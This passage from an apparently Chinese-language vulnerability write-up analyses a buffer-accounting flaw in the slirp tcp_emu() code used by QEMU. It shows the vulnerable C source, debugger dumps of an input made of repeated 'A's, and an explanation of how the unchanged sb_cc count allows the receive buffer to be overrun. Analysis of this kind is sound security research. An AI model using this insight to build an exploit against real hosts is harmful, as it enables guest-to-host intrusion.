</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                struct socket *tmpso;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                struct sockaddr_in addr;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                socklen_t addrlen = sizeof(struct sockaddr_in);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                struct sbuf *so_rcv = &amp;so-&gt;so_rcv;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                so_rcv-&gt;sb_wptr += m-&gt;m_len;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                so_rcv-&gt;sb_rptr += m-&gt;m_len;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                m-&gt;m_data[m-&gt;m_len] = 0; /* NULL terminate */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                if (strchr(m-&gt;m_data, '\r') || strchr(m-&gt;m_data, '\n')) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                    if (sscanf(so_rcv-&gt;sb_data, "%u%*[ ,]%u", &amp;n1, &amp;n2) == 2) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                        HTONS(n1);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                        HTONS(n2);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                        /* n2 is the one on our host */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                        for (tmpso = slirp-&gt;tcb.so_next;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                             tmpso != &amp;slirp-&gt;tcb;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                             tmpso = tmpso-&gt;so_next) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                            if (tmpso-&gt;so_laddr.s_addr == so-&gt;so_laddr.s_addr &amp;&amp;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                                tmpso-&gt;so_lport == n2 &amp;&amp;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                                tmpso-&gt;so_faddr.s_addr == so-&gt;so_faddr.s_addr &amp;&amp;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                                tmpso-&gt;so_fport == n1) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                                if (getsockname(tmpso-&gt;s,
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                                    (struct sockaddr *)&amp;addr, &amp;addrlen) == 0)
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                                   n2 = ntohs(addr.sin_port);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                                break;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                            }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                        }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    so_rcv-&gt;sb_cc = snprintf(so_rcv-&gt;sb_data, so_rcv-&gt;sb_datalen, "%d,%d\r\n", n1, n2);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                    so_rcv-&gt;sb_rptr = so_rcv-&gt;sb_data;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                    so_rcv-&gt;sb_wptr = so_rcv-&gt;sb_data + so_rcv-&gt;sb_cc;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                m_free(m);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>                return 0;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>            }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    case EMU_FTP: /* ftp */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    case EMU_IRC:
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>        ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>        
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    case EMU_REALAUDIO:
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>        ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    default:
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    /* Ooops, not emulated, won't call tcp_emu again */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    so-&gt;so_emu = 0;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    return 1;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>此时函数执行到入口，查看两个参数，第一个参数是结构体<code>struct socket *so</code></p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>pwndbg&gt; print *so
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>$3 = {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_next = 0x555556830220, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_prev = 0x55555682e170, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  s = 15, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  pollfds_idx = 0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  slirp = 0x55555682dfc0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_m = 0x0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_ti = 0x5555579f1d70, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_urgc = 0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  fhost = {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  }, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  lhost = {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    ...
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  }, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_iptos = 16 '\020', 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_emu = 7 '\a', 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_type = 0 '\000', 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_state = 4, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_tcpcb = 0x7fffd2a10110, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_expire = 0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_queued = 0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_nqueued = 0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_rcv = {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    sb_cc = 0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    sb_datalen = 8760, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    sb_wptr = 0x7fffd2d29cc0 "H\b", 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    sb_rptr = 0x7fffd2d29cc0 "H\b", 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    sb_data = 0x7fffd2d29cc0 "H\b"
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  }, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  so_snd = {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    sb_cc = 0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    sb_datalen = 8760, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    sb_wptr = 0x7fffd2d27a80 "H\b", 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    sb_rptr = 0x7fffd2d27a80 "H\b", 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    sb_data = 0x7fffd2d27a80 "H\b"
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  }, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  extra = 0x0
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>可以看到第二个参数<code>mbuf *m</code>的数据就是传入的一大堆<code>A</code></p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>pwndbg&gt; print *m
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>$4 = {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  m_next = 0x5555579ff000, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  m_prev = 0x55555682e068, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  m_nextpkt = 0x0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  m_prevpkt = 0x0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  m_flags = 4, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  m_size = 1544, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  m_so = 0x7fffd29be200, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  m_data = 0x5555579f1db4 'A' &lt;repeats 200 times&gt;..., 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  m_len = 1280, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  slirp = 0x55555682dfc0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  resolution_requested = false, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  expiration_date = 18446744073709551615, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  m_ext = 0x0, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>  m_dat = 0x5555579f1d60 ""
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>有了入口数据，我们来跟一遍代码，最后会发现，先拷贝了数据，当<code>m-&gt;m_data</code>里不存在<code>\r</code>和<code>\n</code>的时候，就不更新<code>so_rcv-&gt;sb_cc</code>，这一点很重要</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>{
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    struct socket *tmpso;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    struct sockaddr_in addr;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    socklen_t addrlen = sizeof(struct sockaddr_in);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    // <span class="ace_cjk" style="width:NaNpx">获</span><span class="ace_cjk" style="width:NaNpx">取</span>so-&gt;so_rcv<span class="ace_cjk" style="width:NaNpx">结</span><span class="ace_cjk" style="width:NaNpx">构</span><span class="ace_cjk" style="width:NaNpx">体</span><span class="ace_cjk" style="width:NaNpx">，</span>sbuf<span class="ace_cjk" style="width:NaNpx">这</span><span class="ace_cjk" style="width:NaNpx">个</span><span class="ace_cjk" style="width:NaNpx">结</span><span class="ace_cjk" style="width:NaNpx">构</span><span class="ace_cjk" style="width:NaNpx">体</span><span class="ace_cjk" style="width:NaNpx">用</span><span class="ace_cjk" style="width:NaNpx">于</span><span class="ace_cjk" style="width:NaNpx">保</span><span class="ace_cjk" style="width:NaNpx">存</span><span class="ace_cjk" style="width:NaNpx">来</span><span class="ace_cjk" style="width:NaNpx">自</span>TCP<span class="ace_cjk" style="width:NaNpx">层</span><span class="ace_cjk" style="width:NaNpx">的</span><span class="ace_cjk" style="width:NaNpx">数</span><span class="ace_cjk" style="width:NaNpx">据</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    struct sbuf *so_rcv = &amp;so-&gt;so_rcv;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    // <span class="ace_cjk" style="width:NaNpx">将</span>m-&gt;m_data<span class="ace_cjk" style="width:NaNpx">数</span><span class="ace_cjk" style="width:NaNpx">据</span><span class="ace_cjk" style="width:NaNpx">写</span><span class="ace_cjk" style="width:NaNpx">入</span>so_rcv-&gt;sb_wptr<span class="ace_cjk" style="width:NaNpx">，</span>m<span class="ace_cjk" style="width:NaNpx">对</span><span class="ace_cjk" style="width:NaNpx">应</span><span class="ace_cjk" style="width:NaNpx">的</span><span class="ace_cjk" style="width:NaNpx">结</span><span class="ace_cjk" style="width:NaNpx">构</span><span class="ace_cjk" style="width:NaNpx">体</span><span class="ace_cjk" style="width:NaNpx">是</span>mbuf<span class="ace_cjk" style="width:NaNpx">，</span><span class="ace_cjk" style="width:NaNpx">用</span><span class="ace_cjk" style="width:NaNpx">于</span><span class="ace_cjk" style="width:NaNpx">保</span><span class="ace_cjk" style="width:NaNpx">存</span><span class="ace_cjk" style="width:NaNpx">来</span><span class="ace_cjk" style="width:NaNpx">自</span>IP<span class="ace_cjk" style="width:NaNpx">层</span><span class="ace_cjk" style="width:NaNpx">的</span><span class="ace_cjk" style="width:NaNpx">数</span><span class="ace_cjk" style="width:NaNpx">据</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    // <span class="ace_cjk" style="width:NaNpx">移</span><span class="ace_cjk" style="width:NaNpx">动</span><span class="ace_cjk" style="width:NaNpx">读</span><span class="ace_cjk" style="width:NaNpx">写</span><span class="ace_cjk" style="width:NaNpx">指</span><span class="ace_cjk" style="width:NaNpx">针</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    so_rcv-&gt;sb_wptr += m-&gt;m_len;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    so_rcv-&gt;sb_rptr += m-&gt;m_len;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    // <span class="ace_cjk" style="width:NaNpx">末</span><span class="ace_cjk" style="width:NaNpx">尾</span><span class="ace_cjk" style="width:NaNpx">置</span><span class="ace_cjk" style="width:NaNpx">空</span><span class="ace_cjk" style="width:NaNpx">截</span><span class="ace_cjk" style="width:NaNpx">断</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    m-&gt;m_data[m-&gt;m_len] = 0; /* NULL terminate */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    // <span class="ace_cjk" style="width:NaNpx">漏</span><span class="ace_cjk" style="width:NaNpx">洞</span><span class="ace_cjk" style="width:NaNpx">出</span><span class="ace_cjk" style="width:NaNpx">现</span><span class="ace_cjk" style="width:NaNpx">在</span><span class="ace_cjk" style="width:NaNpx">这</span><span class="ace_cjk" style="width:NaNpx">里</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    // <span class="ace_cjk" style="width:NaNpx">使</span><span class="ace_cjk" style="width:NaNpx">用</span>`strchr()`<span class="ace_cjk" style="width:NaNpx">搜</span><span class="ace_cjk" style="width:NaNpx">索</span><span class="ace_cjk" style="width:NaNpx">，</span><span class="ace_cjk" style="width:NaNpx">当</span>m-&gt;m_data<span class="ace_cjk" style="width:NaNpx">里</span><span class="ace_cjk" style="width:NaNpx">不</span><span class="ace_cjk" style="width:NaNpx">存</span><span class="ace_cjk" style="width:NaNpx">在</span>`\r`<span class="ace_cjk" style="width:NaNpx">和</span>`\n`<span class="ace_cjk" style="width:NaNpx">的</span><span class="ace_cjk" style="width:NaNpx">时</span><span class="ace_cjk" style="width:NaNpx">候</span><span class="ace_cjk" style="width:NaNpx">，</span><span class="ace_cjk" style="width:NaNpx">返</span><span class="ace_cjk" style="width:NaNpx">回</span>NULL<span class="ace_cjk" style="width:NaNpx">，</span><span class="ace_cjk" style="width:NaNpx">就</span><span class="ace_cjk" style="width:NaNpx">不</span><span class="ace_cjk" style="width:NaNpx">会</span><span class="ace_cjk" style="width:NaNpx">进</span><span class="ace_cjk" style="width:NaNpx">入</span><span class="ace_cjk" style="width:NaNpx">这</span><span class="ace_cjk" style="width:NaNpx">个</span>if
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    if (strchr(m-&gt;m_data, '\r') || strchr(m-&gt;m_data, '\n')) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    if (sscanf(so_rcv-&gt;sb_data, "%u%*[ ,]%u", &amp;n1, &amp;n2) == 2) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    HTONS(n1);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    HTONS(n2);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    /* n2 is the one on our host */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    for (tmpso = slirp-&gt;tcb.so_next;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>         tmpso != &amp;slirp-&gt;tcb;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>         tmpso = tmpso-&gt;so_next) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    if (tmpso-&gt;so_laddr.s_addr == so-&gt;so_laddr.s_addr &amp;&amp;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>        tmpso-&gt;so_lport == n2 &amp;&amp;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>        tmpso-&gt;so_faddr.s_addr == so-&gt;so_faddr.s_addr &amp;&amp;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>        tmpso-&gt;so_fport == n1) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    if (getsockname(tmpso-&gt;s, (struct sockaddr *)&amp;addr, &amp;addrlen) == 0)
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>       n2 = ntohs(addr.sin_port);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    break;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    // so_rcv-&gt;sb_cc<span class="ace_cjk" style="width:NaNpx">的</span><span class="ace_cjk" style="width:NaNpx">值</span><span class="ace_cjk" style="width:NaNpx">只</span><span class="ace_cjk" style="width:NaNpx">有</span><span class="ace_cjk" style="width:NaNpx">这</span><span class="ace_cjk" style="width:NaNpx">里</span><span class="ace_cjk" style="width:NaNpx">会</span><span class="ace_cjk" style="width:NaNpx">更</span><span class="ace_cjk" style="width:NaNpx">新</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    so_rcv-&gt;sb_cc = snprintf(so_rcv-&gt;sb_data, so_rcv-&gt;sb_datalen, "%d,%d\r\n", n1, n2);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    so_rcv-&gt;sb_rptr = so_rcv-&gt;sb_data;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    so_rcv-&gt;sb_wptr = so_rcv-&gt;sb_data + so_rcv-&gt;sb_cc;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    m_free(m);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    return 0;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>查看结构体<code>sbuf</code>的定义可知，<code>so_rcv-&gt;sb_cc</code>就是缓冲区中的字符数量</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>struct sbuf {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    uint32_t sb_cc;     /* actual chars in buffer */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    uint32_t sb_datalen;    /* Length of data  */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    char    *sb_wptr;   /* write pointer. points to where the next
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>     * bytes should be written in the sbuf */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    char    *sb_rptr;   /* read pointer. points to where the next
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>     * byte should be read from the sbuf */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    char    *sb_data;   /* Actual data */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>};
</div></div></div></pre>
<p>我们来看调用<code>tcp_emu()</code>的<code>tcp_input()</code></p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>} else if (ti-&gt;ti_ack == tp-&gt;snd_una &amp;&amp; tcpfrag_list_empty(tp) &amp;&amp; ti-&gt;ti_len &lt;= sbspace(&amp;so-&gt;so_rcv)) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    /*
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>     * this is a pure, in-sequence data packet
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>     * with nothing on the reassembly queue and
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>     * we have enough buffer space to take it.
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>     */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    tp-&gt;rcv_nxt += ti-&gt;ti_len;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    /*
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>     * Add data to socket buffer.
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>     * <span class="ace_cjk" style="width:NaNpx">把</span><span class="ace_cjk" style="width:NaNpx">数</span><span class="ace_cjk" style="width:NaNpx">据</span><span class="ace_cjk" style="width:NaNpx">添</span><span class="ace_cjk" style="width:NaNpx">加</span><span class="ace_cjk" style="width:NaNpx">到</span><span class="ace_cjk" style="width:NaNpx">缓</span><span class="ace_cjk" style="width:NaNpx">冲</span><span class="ace_cjk" style="width:NaNpx">区</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>     */
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    if (so-&gt;so_emu) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    if (tcp_emu(so,m)) sbappend(so, m);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    } else
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    sbappend(so, m);
</div></div></div></pre>
<p>第三个判断是长度，我们来看<code>sbspace()</code>的定义，结合这个定义可以理解这里是在说IP包的长度要小于缓冲区剩余空间</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>#define sbspace(sb) ((sb)-&gt;sb_datalen - (sb)-&gt;sb_cc)
</div></div></div></pre>
<p>静态分析就是这么个情况，我们来动态跑一下</p>
<p>拷贝前先看<code>so_rcv</code>的数据</p>
